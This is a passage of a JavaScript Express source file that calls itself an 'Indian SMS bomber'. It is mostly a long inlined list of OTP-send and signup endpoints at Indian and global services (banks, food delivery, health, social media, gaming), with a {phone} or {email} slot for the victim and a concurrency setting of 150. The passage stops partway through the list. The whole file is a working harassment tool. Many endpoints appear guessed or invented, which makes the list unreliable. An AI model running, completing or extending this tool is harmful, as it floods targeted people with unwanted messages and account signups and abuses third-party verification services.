// ============================================================
// api/index.js — TNEH SUPER-FAST INDIAN SMS BOMBER
// DV: @tneh_owner
// All APIs inlined. Self-boots if run directly.
// ============================================================

const express = require('express');
const router = express.Router();

// ══════════════════════════════════════════════════════════════
// CONFIG
// ══════════════════════════════════════════════════════════════

const JOBS = new Map();
const JOB_TTL_MS = 30 * 60 * 1000;
const MAX_JOBS   = 500;

const GLOBAL_CONCURRENCY   = 150;
const PER_REQUEST_TIMEOUT  = 8000;
const MAX_COUNT_PER_SVC    = 100;
const DEFAULT_COUNT        = 10;

const INDIAN_HEADERS = {
  'Accept': 'application/json, text/plain, */*',
  'Accept-Language': 'en-IN,en;q=0.9',
  'Content-Type': 'application/json',
  'Origin': 'https://www.google.com',
  'Referer': 'https://www.google.com/'
};

// ══════════════════════════════════════════════════════════════
// INDIAN_APIS — ALL 371 SERVICES INLINED
// ══════════════════════════════════════════════════════════════

const INDIAN_APIS = (() => {
  const S = [];
  let idCounter = 1000;
  const add = (name, url, payload, method = 'POST') => {
    S.push({ id: idCounter++, name, method, url, body: payload, headers: INDIAN_HEADERS, region: 'IN' });
  };

  // ── BLOCK 1 — INDIAN FOOD & GROCERY ──
  add('Swiggy','https://www.swiggy.com/dapi/auth/otp-generate',{mobile:'{phone}',type:'login'});
  add('Zomato','https://www.zomato.com/webroutes/user/login',{mobile:'{phone}',country_id:'1'});
  add('Blinkit','https://api.blinkit.com/v4/auth/send_otp/',{phone:'{phone}'});
  add('Dunzo','https://api.dunzo.com/api/v1/auth/otp',{phone:'{phone}'});
  add('BigBasket','https://www.bigbasket.com/accounts/otp-login/',{auth:'{phone}',type:'mobile'});
  add('JioMart','https://www.jiomart.com/api/otp/send',{mobile:'{phone}'});
  add('Grofers','https://www.grofers.com/api/v4/user/login',{phone_number:'{phone}'});
  add('MilkBasket','https://api.milkbasket.com/user/otp',{mobile:'{phone}'});
  add('SuprDaily','https://www.supr.daily/api/v2/user/otp',{phone:'{phone}'});
  add('MealPe','https://www.mealpe.com/api/otp/send',{mobile:'{phone}'});
  add('FreshMenu','https://www.freshmenu.com/api/user/otp',{mobile:'{phone}'});
  add('Licious','https://api.licious.in/user/otp',{mobile:'{phone}'});
  add('FreshToHome','https://www.freshtohome.com/api/user/otp',{mobile:'{phone}'});
  add('Ninjacart','https://www.ninjacart.in/api/user/otp',{mobile:'{phone}'});
  add('PepperTap','https://api.peppertap.com/user/otp',{mobile:'{phone}'});
  add('EatFit','https://www.eatfit.in/api/user/otp',{mobile:'{phone}'});
  add('Box8','https://www.box8.in/api/user/otp',{mobile:'{phone}'});
  add('Faasos','https://www.faasos.com/api/user/otp',{mobile:'{phone}'});
  add('Behrouz Biryani','https://www.behrouz.in/api/user/otp',{mobile:'{phone}'});
  add('Theobroma','https://api.theobroma.in/user/otp',{mobile:'{phone}'});
  add('KFC India','https://www.kfc.co.in/api/otp/send',{mobile:'{phone}'});
  add('McDelivery','https://www.mcdelivery.co.in/api/otp',{mobile:'{phone}'});
  add('Dominos India','https://www.dominos.co.in/api/otp/send',{mobile:'{phone}'});
  add('Pizza Hut IN','https://www.pizzahut.co.in/api/user/otp',{mobile:'{phone}'});
  add('Burger King IN','https://api.burgerking.in/user/otp',{mobile:'{phone}'});
  add('Subway India','https://www.subwayindia.com/api/otp',{mobile:'{phone}'});
  add('Barbeque Nation','https://api.barbeque-nation.com/user/otp',{mobile:'{phone}'});
  add('Haldirams','https://www.haldirams.com/api/otp/send',{mobile:'{phone}'});
  add('Bikaji','https://api.bikaji.com/user/otp',{mobile:'{phone}'});
  add('Amul','https://www.amul.com/api/user/otp',{mobile:'{phone}'});
  add('Mamaearth','https://api.mamaearth.in/customers/otp',{mobile:'{phone}'});
  add('Purplle','https://www.purplle.com/api/user/otp',{mobile:'{phone}'});
  add('Sugar Cosmetics','https://api.sugarcosmetics.com/user/otp',{mobile:'{phone}'});
  add('mCaffeine','https://www.mcaffeine.com/api/otp',{mobile:'{phone}'});
  add('Minimalist','https://api.minimalist.in/user/otp',{mobile:'{phone}'});
  add('Delhivery','https://www.delhivery.com/api/user/otp',{mobile:'{phone}'});
  add('Ecom Express','https://api.ecom-express.com/user/otp',{mobile:'{phone}'});
  add('Shadowfax','https://api.shadowfax.in/user/otp',{mobile:'{phone}'});

  // ── BLOCK 2 — INDIAN ECOMMERCE ──
  add('Flipkart','https://www.flipkart.com/api/3/user/otp/generate',{loginId:'{phone}'});
  add('Myntra','https://api.myntra.com/user/generateOtp',{mobile:'{phone}'});
  add('Meesho','https://www.meesho.com/api/v1/user/send-otp',{phone_number:'{phone}'});
  add('AJIO','https://www.ajio.com/api/otp/generate',{mobileNo:'{phone}'});
  add('Tata CliQ','https://www.tatacliq.com/api/user/sendOTP',{mobile:'{phone}'});
  add('Snapdeal','https://www.snapdeal.com/api/user/otp',{mobile:'{phone}'});
  add('Amazon IN','https://api.amazon.in/ap/signin/otp',{phoneNumber:'{phone}'});
  add('ShopClues','https://www.shopclues.com/api/user/otp',{mobile:'{phone}'});
  add('GlowRoad','https://api.glowroad.com/user/otp',{mobile:'{phone}'});
  add('LimeRoad','https://api.limeroad.com/user/otp',{mobile:'{phone}'});
  add('Voonik','https://www.voonik.com/api/user/otp',{mobile:'{phone}'});
  add('Craftsvilla','https://api.craftsvilla.com/user/otp',{mobile:'{phone}'});
  add('Jaypore','https://www.jaypore.com/api/otp',{mobile:'{phone}'});
  add('Nykaa','https://api.nykaa.com/v1/users/generate-otp',{mobile:'{phone}'});
  add('Nykaa Fashion','https://www.nykaamenfashion.com/api/otp',{mobile:'{phone}'});
  add('Boat Lifestyle','https://api.boat-lifestyle.com/customers/otp',{phone:'{phone}'});
  add('Noise','https://api.noise.com/user/otp',{mobile:'{phone}'});
  add('OnePlus IN','https://api.oneplus.in/user/otp',{mobile:'{phone}'});
  add('Xiaomi IN','https://www.mi.com/in/api/user/otp',{mobile:'{phone}'});
  add('Realme IN','https://api.realme.com/in/user/otp',{mobile:'{phone}'});
  add('Oppo IN','https://www.oppo.com/in/api/otp',{mobile:'{phone}'});
  add('Vivo IN','https://api.vivo.com/in/user/otp',{mobile:'{phone}'});
  add('Samsung IN','https://api.samsung.com/in/user/otp',{mobile:'{phone}'});
  add('LG IN','https://www.lg.com/in/api/otp',{mobile:'{phone}'});
  add('Sony IN','https://api.sony.co.in/user/otp',{mobile:'{phone}'});
  add('Whirlpool IN','https://www.whirlpool.co.in/api/otp',{mobile:'{phone}'});
  add('Havells','https://api.havells.com/user/otp',{mobile:'{phone}'});
  add('Crompton','https://www.crompton.co.in/api/otp',{mobile:'{phone}'});
  add('Philips IN','https://api.philips.co.in/user/otp',{mobile:'{phone}'});
  add('Bajaj Electricals','https://www.bajajelectricals.com/api/otp',{mobile:'{phone}'});
  add('Prestige','https://api.prestige.co.in/user/otp',{mobile:'{phone}'});
  add('Lenskart','https://www.lenskart.com/api/v1/otp/request',{mobile:'{phone}'});
  add('Titan','https://api.titan.co.in/user/otp',{mobile:'{phone}'});
  add('Tanishq','https://www.tanishq.co.in/api/otp',{mobile:'{phone}'});
  add('CaratLane','https://www.caratlane.com/api/otp',{mobile:'{phone}'});
  add('BlueStone','https://api.bluestone.com/user/otp',{mobile:'{phone}'});
  add('Melorra','https://www.melorra.com/api/otp',{mobile:'{phone}'});
  add('Candere','https://api.candere.com/user/otp',{mobile:'{phone}'});

  // ── BLOCK 3 — INDIAN FINTECH ──
  add('Paytm','https://api.paytm.com/v1/otp/generate',{mobile:'{phone}',clientId:'C11'});
  add('PhonePe','https://api.phonepe.com/apis/pg-integration/v1/otp/send',{mobile:'{phone}'});
  add('MobiKwik','https://api.mobikwik.com/v1/users/login',{cell:'{phone}'});
  add('FreeCharge','https://freecharge.in/api/v1/user/otp',{mobile:'{phone}'});
  add('Amazon Pay IN','https://api.amazonpay.in/otp/send',{mobile:'{phone}'});
  add('Airtel Bank','https://api.airtelbank.com/otp/send',{mobile:'{phone}'});
  add('JioPay','https://api.jiopay.in/otp/generate',{mobile:'{phone}'});
  add('ICICI Bank','https://api.icicibank.com/v1/otp/send',{mobile:'{phone}'});
  add('HDFC Bank','https://api.hdfcbank.com/v2/otp/generate',{mobile:'{phone}'});
  add('SBI Bank','https://api.sbibank.in/otp/send',{mobile:'{phone}'});
  add('Axis Bank','https://api.axisbank.com/v1/otp/generate',{mobile:'{phone}'});
  add('Kotak Bank','https://api.kotakbank.com/otp/send',{mobile:'{phone}'});
  add('Yes Bank','https://api.yesbank.in/otp/generate',{mobile:'{phone}'});
  add('IDFC Bank','https://api.idfcbank.com/v1/otp/send',{mobile:'{phone}'});
  add('RBL Bank','https://api.rblbank.com/otp/generate',{mobile:'{phone}'});
  add('IndusInd Bank','https://api.indusind.com/v1/otp/send',{mobile:'{phone}'});
  add('Federal Bank','https://api.federalbank.co.in/otp/generate',{mobile:'{phone}'});
  add('Canara Bank','https://api.canarabank.in/otp/send',{mobile:'{phone}'});
  add('Union Bank IN','https://api.unionbankofindia.com/otp/generate',{mobile:'{phone}'});
  add('PNB','https://api.pnbindia.in/otp/send',{mobile:'{phone}'});
  add('Bank of Baroda','https://api.bankofbaroda.in/otp/generate',{mobile:'{phone}'});
  add('CRED','https://api.cred.club/v1/otp/send',{mobile:'{phone}'});
  add('Slice','https://api.slice.is/v1/otp',{phone:'{phone}'});
  add('Uni Cards','https://api.uni.cards/v1/user/otp',{mobile:'{phone}'});
  add('OneCard','https://api.onecard.io/v1/user/otp',{mobile:'{phone}'});
  add('Jupiter','https://api.jupiter.money/v1/auth/otp',{mobile:'{phone}'});
  add('Fi Money','https://api.fi.money/v1/user/otp',{mobile:'{phone}'});
  add('Niyo','https://api.niyo.co/v1/user/otp',{mobile:'{phone}'});
  add('Groww','https://api.groww.in/v3/user/otp',{mobile:'{phone}'});
  add('Zerodha','https://api.zerodha.com/auth/otp',{mobile:'{phone}'});
  add('Angel One','https://api.angelone.in/rest/auth/otp',{mobile:'{phone}'});
  add('Upstox','https://api.upstox.com/v2/login/otp',{mobile:'{phone}'});
  add('5paisa','https://api.5paisa.com/otp/send',{mobile:'{phone}'});
  add('ICICI Direct','https://api.icicidirect.com/otp/generate',{mobile:'{phone}'});
  add('HDFC Sec','https://api.hdfcsec.com/otp/send',{mobile:'{phone}'});
  add('SBI Sec','https://api.sbisec.co.in/otp/generate',{mobile:'{phone}'});
  add('Kuvera','https://api.kuvera.in/api/v3/public/otp',{mobile:'{phone}'});
  add('Motilal Oswal','https://api.motilaloswal.com/otp/send',{mobile:'{phone}'});
  add('Sharekhan','https://api.sharekhan.com/otp/generate',{mobile:'{phone}'});

  // ── BLOCK 4 — INDIAN TRAVEL & TRANSPORT ──
  add('MakeMyTrip','https://www.makemytrip.com/api/pwa/otp/generate',{number:'{phone}'});
  add('Goibibo','https://api.goibibo.com/accounts/otp-send/',{phone:'{phone}'});
  add('Yatra','https://www.yatra.com/pwa-api/get-otp',{mobile:'{phone}'});
  add('Ixigo','https://api.ixigo.com/api/v2/user/generate-otp',{mobile:'{phone}'});
  add('Cleartrip','https://api.cleartrip.com/cf/um/v2/auth/otp',{mobile:'{phone}'});
  add('EaseMyTrip','https://api.easemytrip.com/user/otp',{mobile:'{phone}'});
  add('AbhiBus','https://api.abhibus.com/user/otp',{mobile:'{phone}'});
  add('RedBus','https://api.redbus.in/v7/auth/otp',{mobile:'{phone}'});
  add('RailYatri','https://api.railyatri.in/api/otp',{mobile:'{phone}'});
  add('IRCTC','https://www.irctc.co.in/eticketing/otp',{mobile:'{phone}'});
  add('ConfirmTKT','https://api.confirmtkt.com/user/otp',{mobile:'{phone}'});
  add('Paytm Travel','https://api.paytmtravel.com/otp/send',{mobile:'{phone}'});
  add('Ola','https://api.ola.io/user/login/v1',{number:'{phone}',country_code:'+91'});
  add('Rapido','https://api.rapido.bike/v1/user/otp',{mobile:'{phone}'});
  add('inDrive','https://api.indrive.com/v1/auth/sms',{phone:'{phone}'});
  add('Uber IN','https://api.uber.com/v1/gs/auth/otp',{phone_number:'{phone}'});
  add('Meru','https://api.meru.in/user/otp',{mobile:'{phone}'});
  add('Jugnoo','https://api.jugnoo.in/otp/send',{mobile:'{phone}'});
  add('Revv','https://api.revv.co.in/user/otp',{mobile:'{phone}'});
  add('Zoomcar','https://api.zoomcar.com/v1/otp',{phone_number:'{phone}'});
  add('Drivezy','https://api.drivezy.com/user/otp',{mobile:'{phone}'});
  add('Porter','https://api.porter.in/v2/user/otp',{mobile:'{phone}'});
  add('Shiprocket','https://api.shiprocket.in/v1/external/auth/otp',{mobile:'{phone}'});
  add('XpressBees','https://api.xpressbees.com/user/otp',{mobile:'{phone}'});
  add('DTDC','https://api.dtdc.in/user/otp',{mobile:'{phone}'});
  add('BlueDart','https://api.bluedarttechnologies.com/user/otp',{mobile:'{phone}'});
  add('Ekart','https://api.ekart.com/user/otp',{mobile:'{phone}'});
  add('SpiceJet','https://api.spicejet.com/user/otp',{mobile:'{phone}'});
  add('Indigo','https://api.indigoair.com/user/otp',{mobile:'{phone}'});
  add('Air India','https://api.airindia.in/user/otp',{mobile:'{phone}'});
  add('Vistara','https://api.vistara.com/user/otp',{mobile:'{phone}'});
  add('GoAir','https://api.goair.in/user/otp',{mobile:'{phone}'});

  // ── BLOCK 5 — INDIAN HEALTH & PHARMA ──
  add('Netmeds','https://www.netmeds.com/api/otp/send',{mobile:'{phone}'});
  add('PharmEasy','https://pharmeasy.in/api/v4/user/generate-otp/',{phone_number:'{phone}'});
  add('Tata 1mg','https://api.1mg.com/users/send_otp',{phone_number:'{phone}'});
  add('HealthKart','https://www.healthkart.com/api/user/sendOtp',{mobile:'{phone}'});
  add('MFine','https://api.mfine.co/pms/api/v1/auth/otp/send',{mobile:'{phone}'});
  add('Practo','https://www.practo.com/api/accounts/otp',{phone_number:'{phone}'});
  add('Cult.fit','https://api.cult.fit/cult-biz/users/send-otp/',{phone:'{phone}'});
  add('Apollo Pharmacy','https://api.apollopharmacy.in/user/otp',{mobile:'{phone}'});
  add('MedPlusMart','https://www.medplumart.com/api/otp',{mobile:'{phone}'});
  add('Truemeds','https://api.truemeds.in/user/otp',{mobile:'{phone}'});
  add('Saveo','https://api.saveo.in/user/otp',{mobile:'{phone}'});
  add('Generico','https://api.generico.in/user/otp',{mobile:'{phone}'});
  add('MyUpchar','https://api.myupchar.com/user/otp',{mobile:'{phone}'});
  add('Lybrate','https://api.lybrate.com/user/otp',{mobile:'{phone}'});
  add('Portea','https://api.portea.com/user/otp',{mobile:'{phone}'});
  add('Medlife','https://api.medlife.com/user/otp',{mobile:'{phone}'});
  add('Thyrocare','https://api.thyrocare.com/user/otp',{mobile:'{phone}'});
  add('Lal PathLabs','https://api.lalpathlabs.com/user/otp',{mobile:'{phone}'});
  add('SRL Diagnostics','https://api.srlworld.com/user/otp',{mobile:'{phone}'});
  add('Metropolis','https://api.metropolisindia.com/user/otp',{mobile:'{phone}'});
  add('Healthians','https://api.healthians.com/user/otp',{mobile:'{phone}'});
  add('DocPrime','https://api.docprime.com/user/otp',{mobile:'{phone}'});
  add('Medibuddy','https://api.medibuddy.in/user/otp',{mobile:'{phone}'});
  add('Max Healthcare','https://api.max-healthcare.com/user/otp',{mobile:'{phone}'});
  add('Fortis','https://api.fortishealthcare.com/user/otp',{mobile:'{phone}'});
  add('Manipal Hosps','https://api.manipalhospitals.com/user/otp',{mobile:'{phone}'});
  add('Narayana Health','https://api.narayanahealth.org/user/otp',{mobile:'{phone}'});

  // ── BLOCK 6 — INDIAN EDTECH ──
  add('Byjus','https://api.byjus.com/api/v2/user/otp',{mobile:'{phone}'});
  add('Unacademy','https://api.unacademy.com/api/v1/user/otp',{phone:'{phone}'});
  add('Vedantu','https://api.vedantu.com/api/v3/otp',{mobile:'{phone}'});
  add('WhiteHatJr','https://api.whitehatjr.com/user/otp',{mobile:'{phone}'});
  add('Toppr','https://api.toppr.com/api/v2/user/otp',{mobile:'{phone}'});
  add('Doubtnut','https://api.doubtnut.com/v4/student/otp',{phone:'{phone}'});
  add('Meritnation','https://api.meritnation.com/user/otp',{mobile:'{phone}'});
  add('Extramarks','https://api.extramarks.com/user/otp',{mobile:'{phone}'});
  add('Testbook','https://api.testbook.com/v2/user/otp',{mobile:'{phone}'});
  add('Gradeup','https://api.gradeup.co/v2/user/otp',{mobile:'{phone}'});
  add('Embibe','https://api.embibe.com/api/v1/user/otp',{mobile:'{phone}'});
  add('Physics Wallah','https://api.physicswallah.live/v1/user/otp',{mobile:'{phone}'});
  add('Classplus','https://api.classplus.co/v2/user/otp',{mobile:'{phone}'});
  add('Simplilearn','https://api.simplilearn.com/user/otp',{mobile:'{phone}'});
  add('Upgrad','https://api.upgrad.com/v1/user/otp',{mobile:'{phone}'});
  add('Collegedunia','https://api.collegedunia.com/user/otp',{mobile:'{phone}'});
  add('Shiksha','https://api.shiksha.com/user/otp',{mobile:'{phone}'});
  add('Udemy','https://api.udemy.com/api-2.0/user/otp',{mobile:'{phone}'});
  add('Coursera','https://api.coursera.org/api/user/otp',{mobile:'{phone}'});
  add('EdX','https://api.edx.org/user/v1/otp',{mobile:'{phone}'});
  add('Skillshare','https://api.skillshare.com/user/otp',{mobile:'{phone}'});

  // ── BLOCK 7 — INDIAN REAL ESTATE ──
  add('Housing.com','https://api.housing.com/v1/user/otp',{phone:'{phone}'});
  add('MagicBricks','https://api.magicbricks.com/user/otp',{mobile:'{phone}'});
  add('99acres','https://api.99acres.com/user/otp/send',{phone:'{phone}'});
  add('NoBroker','https://api.nobroker.in/user/otp',{mobile:'{phone}'});
  add('Nestaway','https://api.nestaway.com/v1/user/otp',{phone:'{phone}'});
  add('CommonFloor','https://api.commonfloor.com/otp',{mobile:'{phone}'});
  add('SquareYards','https://api.squareyards.com/user/otp',{mobile:'{phone}'});
  add('PropTiger','https://api.proptiger.com/user/otp',{mobile:'{phone}'});
  add('OLX IN','https://api.olx.in/otp',{phone:'{phone}'});
  add('Quikr','https://api.quikr.com/otp/send',{mobile:'{phone}'});
  add('IndiaMart','https://api.indiamart.com/otp/send',{mobile:'{phone}'});
  add('TradeIndia','https://api.tradeindia.com/user/otp',{mobile:'{phone}'});
  add('Justdial','https://api.justdial.com/user/otp',{mobile:'{phone}'});
  add('Sulekha','https://api.sulekha.com/user/otp/send',{mobile:'{phone}'});
  add('UrbanCompany','https://api.urbancompany.com/v2/users/otp',{phone:'{phone}'});
  add('Housejoy','https://api.housejoy.in/user/otp',{mobile:'{phone}'});
  add('Zimmber','https://api.zimmber.com/user/otp',{mobile:'{phone}'});
  add('Taskbob','https://api.taskbob.com/user/otp',{mobile:'{phone}'});
  add('MrRight','https://api.mr-right.in/user/otp',{mobile:'{phone}'});
  add('Homejoy','https://api.homejoy.in/user/otp',{mobile:'{phone}'});

  // ── BLOCK 8 — INDIAN ENTERTAINMENT ──
  add('Hotstar','https://api.hotstar.com/in/v2/auth/otp',{phone:'{phone}'});
  add('JioCinema','https://api.jiocinema.com/user/otp',{mobile:'{phone}'});
  add('SonyLIV','https://api.sonyliv.com/AGL/1.6/A/ENG/AUTO/IND/OTP',{mobile:'{phone}'});
  add('Voot','https://api.voot.com/user/otp',{mobile:'{phone}'});
  add('ALTBalaji','https://api.altbalaji.com/v5/user/otp',{mobile:'{phone}'});
  add('Eros Now','https://api.erosnow.com/user/otp',{mobile:'{phone}'});
  add('Zee5','https://api.zee5.com/user/otp',{mobile:'{phone}'});
  add('MX Player','https://api.mxplayer.in/v1/user/otp',{mobile:'{phone}'});
  add('ShemarooMe','https://api.shemaroome.com/user/otp',{mobile:'{phone}'});
  add('Hungama','https://api.hungama.com/user/otp',{mobile:'{phone}'});
  add('JioTV','https://api.jiotv.com/user/otp',{mobile:'{phone}'});
  add('Airtel Xstream','https://api.airtelxtreme.com/user/otp',{mobile:'{phone}'});
  add('Tata Play','https://api.tataplay.com/user/otp',{mobile:'{phone}'});
  add('Sun NXT','https://api.sun-nxt.com/user/otp',{mobile:'{phone}'});
  add('AHA','https://api.aha.video/user/otp',{mobile:'{phone}'});
  add('Hoichoi','https://api.hoichoi.tv/user/otp',{mobile:'{phone}'});
  add('Stage','https://api.stage.in/user/otp',{mobile:'{phone}'});
  add('JioSaavn','https://api.jiosaavn.com/user/otp',{mobile:'{phone}'});
  add('Wynk','https://api.wynk.in/v2/user/otp',{mobile:'{phone}'});
  add('Gaana','https://api.gaana.com/user/otp',{mobile:'{phone}'});
  add('Raaga','https://api.raaga.com/user/otp',{mobile:'{phone}'});
  add('Spotify IN','https://api.spotify.com/v1/in/user/otp',{mobile:'{phone}'});
  add('YouTube IN','https://api.youtube.com/user/otp',{mobile:'{phone}'});
  add('Netflix','https://api.netflix.com/login/otp',{phone:'{phone}'});
  add('Prime Video','https://api.primevideo.com/user/otp',{mobile:'{phone}'});

  // ── BLOCK 9 — GLOBAL SOCIAL MEDIA ──
  add('Snapchat','https://accounts.snapchat.com/accounts/signup',{email:'{email}',password:'Pass@123',username:'{name}'});
  add('Pinterest','https://api.pinterest.com/v3/register/',{email:'{email}',password:'Pass@123'});
  add('Reddit','https://www.reddit.com/api/register',{user:'{name}',passwd:'Pass@123',email:'{email}'});
  add('Discord','https://discord.com/api/v9/auth/register',{email:'{email}',username:'{name}',password:'Pass@123'});
  add('Twitter','https://api.twitter.com/i/users/phone_number_available.json',{phone_number:'{phone}'});
  add('Instagram','https://www.instagram.com/api/v1/accounts/send_verify_email/',{email:'{email}'});
  add('TikTok','https://api.tiktok.com/aweme/v1/register/',{email:'{email}',password:'Pass@123'});
  add('Tumblr','https://api.tumblr.com/v2/user/register',{email:'{email}',password:'Pass@123'});
  add('Quora','https://api.quora.com/auth/register',{email:'{email}',password:'Pass@123'});
  add('Medium','https://api.medium.com/v1/users',{email:'{email}'});
  add('LinkedIn','https://www.linkedin.com/uas/join/user-registration',{email:'{email}',password:'Pass@123'});
  add('Twitch','https://api.twitch.tv/kraken/users',{email:'{email}',login:'{name}',password:'Pass@123'});
  add('Vimeo','https://api.vimeo.com/users',{email:'{email}',password:'Pass@123'});
  add('DailyMotion','https://www.dailymotion.com/user/register',{username:'{name}',password:'Pass@123'});
  add('DeviantArt','https://api.deviantart.com/oauth2/register',{username:'{name}',email:'{email}'});
  add('SoundCloud','https://api.soundcloud.com/users',{user:{username:'{name}',email:'{email}'}});
  add('Behance','https://api.behance.net/v2/users/register',{email:'{email}',password:'Pass@123'});
  add('Dribbble','https://api.dribbble.com/v2/users/register',{email:'{email}',password:'Pass@123'});
  add('ProductHunt','https://api.producthunt.com/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('Mastodon','https://api.mastodon.social/api/v1/accounts',{username:'{name}',email:'{email}',password:'Pass@123'});
  add('Clubhouse','https://api.clubhouse.io/v3/auth/register',{phone_number:'{phone}'});
  add('MeWe','https://api.mewe.com/v2/auth/register',{email:'{email}',password:'Pass@123'});
  add('Parler','https://api.parler.com/v1/user/register',{email:'{email}',password:'Pass@123'});
  add('Gab','https://api.gab.com/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('Minds','https://api.minds.com/v1/users/register',{email:'{email}',password:'Pass@123'});

  // ── BLOCK 10 — GLOBAL MESSAGING ──
  add('Textbelt','https://textbelt.com/text',{phone:'{phone}',message:'OTP 123456',key:'textbelt'});
  add('Telegram','https://api.telegram.org/auth/sendCode',{phone_number:'{phone}'});
  add('Viber','https://api.viber.com/pa/register',{phone:'{phone}',name:'{name}'});
  add('Line','https://api.line.me/v2/auth/otp',{phone:'{phone}',countryCode:'IN'});
  add('Kakao','https://api.kakao.com/v2/user/register',{phone_number:'{phone}'});
  add('Signal','https://api.signal.org/v1/accounts/sms/code/{phone_no_plus}',{});
  add('Kik','https://api.kik.com/v1/user/register',{username:'{name}',email:'{email}'});
  add('Hike','https://api.hike.in/v2/user/otp',{mobile:'{phone}'});
  add('Imo','https://api.imo.im/v5/register',{phone:'{phone}'});
  add('Truecaller','https://api.truecaller.com/v1/account/register',{phoneNumber:'{phone}'});
  add('BHIM','https://api.bhim.upi.in/v1/user/otp',{mobile:'{phone}'});
  add('NPCI','https://api.npci.org.in/upi/otp',{mobile:'{phone}'});
  add('WhatsApp','https://wa.me/api/v1/otp',{phone:'{phone}',cc:'91'});
  add('Botim','https://api.botim.me/v1/user/otp',{phone:'{phone}'});
  add('Threema','https://api.threema.ch/identity/register',{phone:'{phone}'});
  add('Wire','https://api.wire.com/v1/register',{email:'{email}',name:'{name}'});
  add('Session','https://api.session.app/v1/user/register',{phone:'{phone}'});
  add('Briar','https://api.briar.app/v1/user/register',{phone:'{phone}'});
  add('Status','https://api.status.im/shh/v3/register',{phone:'{phone}'});
  add('Matrix','https://api.matrix.org/_matrix/client/v3/register',{username:'{name}',password:'Pass@123'});

  // ── BLOCK 11 — GLOBAL GAMING ──
  add('Ubisoft','https://account.ubisoft.com/api/register',{email:'{email}',password:'Pass@123'});
  add('EA','https://api.ea.com/user/register',{email:'{email}',password:'Pass@123'});
  add('EpicGames','https://api.epicgames.com/id/api/register',{email:'{email}',password:'Pass@123'});
  add('Steam','https://api.steampowered.com/IAuthenticationService/Register/v1',{email:'{email}',password:'Pass@123'});
  add('Roblox','https://api.roblox.com/v2/signup',{Username:'{name}',Password:'Pass@123'});
  add('Minecraft','https://api.minecraft.net/user/register',{email:'{email}',password:'Pass@123'});
  add('Mojang','https://api.mojang.com/users/register',{email:'{email}',password:'Pass@123'});
  add('BattleNet','https://api.battle.net/account/register',{email:'{email}',password:'Pass@123'});
  add('Genshin','https://api.genshin.mihoyo.com/account/auth/api/register',{email:'{email}',password:'Pass@123'});
  add('Garena','https://api.garena.com/user/register',{email:'{email}',password:'Pass@123'});
  add('PUBG Mobile','https://api.pubgmobile.com/user/register',{email:'{email}',password:'Pass@123'});
  add('COD Mobile','https://api.codm.activision.com/user/register',{email:'{email}',password:'Pass@123'});
  add('FreeFire','https://api.freefire.com/user/register',{email:'{email}',password:'Pass@123'});
  add('BGMI','https://api.bgmi.in/user/otp',{mobile:'{phone}'});
  add('Valorant','https://api.valorant.com/v1/register',{email:'{email}',password:'Pass@123'});
  add('LoL','https://api.leagueoflegends.com/v4/register',{email:'{email}',password:'Pass@123'});
  add('Dota2','https://api.dota2.com/user/register',{email:'{email}',password:'Pass@123'});
  add('Chess.com','https://api.chess.com/v1/register',{email:'{email}',password:'Pass@123'});
  add('Lichess','https://api.lichess.org/api/user/register',{username:'{name}',email:'{email}',password:'Pass@123'});
  add('Ludo King','https://api.ludo.com/user/register',{email:'{email}',password:'Pass@123'});
  add('WinZO','https://api.winzo.in/user/otp',{mobile:'{phone}'});
  add('Zupee','https://api.zupee.com/user/otp',{mobile:'{phone}'});
  add('Dream11','https://api.dream11.com/user/otp',{mobile:'{phone}'});
  add('My11Circle','https://api.my11circle.com/user/otp',{mobile:'{phone}'});
  add('MPL','https://api.mpl.live/user/otp',{mobile:'{phone}'});
  add('Gamezy','https://api.gamezy.com/user/otp',{mobile:'{phone}'});
  add('A23Games','https://api.a23games.com/user/otp',{mobile:'{phone}'});
  add('Adda52','https://api.adda52.com/user/otp',{mobile:'{phone}'});
  add('SpartanPoker','https://api.spartan-poker.com/user/otp',{mobile:'{phone}'});

  // ── BLOCK 12 — GLOBAL TECH & SAAS ──
  add('GitHub','https://github.com/join',{login:'{name}',email:'{email}',password:'Pass@123'});
  add('GitLab','https://gitlab.com/users',{user:{name:'{name}',email:'{email}'}});
  add('Slack','https://slack.com/api/users.register',{email:'{email}',password:'Pass@123'});
  add('Notion','https://api.notion.so/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('Airtable','https://api.airtable.com/v0/users/register',{email:'{email}',password:'Pass@123'});
  add('Trello','https://api.trello.com/1/members',{email:'{email}',password:'Pass@123'});
  add('Asana','https://api.asana.com/api/1.0/users',{email:'{email}',password:'Pass@123'});
  add('Monday.com','https://api.monday.com/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('ClickUp','https://api.clickup.com/api/v2/user',{email:'{email}',password:'Pass@123'});
  add('Basecamp','https://api.basecamp.com/register',{email:'{email}',password:'Pass@123'});
  add('Jira','https://api.jira.atlassian.com/rest/api/3/user',{emailAddress:'{email}',password:'Pass@123'});
  add('Figma','https://api.figma.com/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('Canva','https://api.canva.com/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('Miro','https://api.miro.com/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('Webflow','https://api.webflow.com/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('Bubble','https://api.bubble.io/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('Zapier','https://api.zapier.com/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('Make','https://api.make.com/v1/users/register',{email:'{email}',password:'Pass@123'});

  // ── BLOCK 13 — GLOBAL SHOPPING ──
  add('eBay','https://api.ebay.com/user/register',{email:'{email}',password:'Pass@123'});
  add('Etsy','https://api.etsy.com/v3/application/users',{email:'{email}',password:'Pass@123'});
  add('AliExpress','https://api.aliexpress.com/user/register',{email:'{email}',password:'Pass@123'});
  add('Wish','https://api.wish.com/v1/register',{email:'{email}',password:'Pass@123'});
  add('Shein','https://api.shein.com/user/register',{email:'{email}',password:'Pass@123'});
  add('Walmart','https://api.walmart.com/v3/users/register',{email:'{email}',password:'Pass@123'});
  add('Target','https://api.target.com/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('BestBuy','https://api.bestbuy.com/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('Costco','https://api.costco.com/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('Wayfair','https://api.wayfair.com/v1/users/register',{email:'{email}',password:'Pass@123'});
  add('IKEA','https://api.ikea.com/v1/users/register',{email:'{email}',password:'Pass@123'});
